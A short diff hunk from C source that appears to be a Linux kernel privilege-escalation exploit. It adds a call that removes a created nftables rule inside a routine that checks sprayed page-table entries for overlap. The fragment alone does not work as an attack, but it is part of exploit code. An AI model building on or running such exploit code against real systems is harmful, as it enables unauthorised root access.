@@ -348,6 +348,9 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 	printf("[*] checking %d sprayed pte's for overlap...\n", CONFIG_PTE_SPRAY_AMOUNT);
 
+	//remove created rule just in case
+	unconfigure_nftables();
+
 	// find overlapped PTE area
 	pte_area = NULL;
 	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
